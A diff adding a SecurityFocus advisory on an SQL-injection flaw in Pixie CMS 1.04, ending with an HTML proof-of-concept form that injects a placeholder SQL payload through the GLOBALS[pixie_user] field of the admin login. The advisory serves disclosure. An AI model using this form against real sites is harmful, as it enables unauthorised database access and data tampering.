@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/45937/info
+
+Pixie is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+Pixie CMS 1.04 is vulnerable; other versions may also be affected.
+
+NOTE (May 10, 2011): This BID was previously titled 'Pixie Multiple SQL Injection Vulnerabilities'. It has been re-written because one of the vulnerabilities duplicates an issue described in BID 34189 (Pixie CMS SQL Injection and Cross Site Scripting Vulnerabilities). 
+
+<form action="http://www.example.com/admin/index.php" method="post" name="main" >
+<input name="username" value="1" type="hidden">
+<input name="password" value="1" type="hidden">
+<input name="login_submit" value="1" type="hidden">
+<input name="GLOBALS[pixie_user]" value="123'SQL_CODE_HERE" type="hidden">
+<input type="submit" value="submit" name="submit" />
+</form>
+
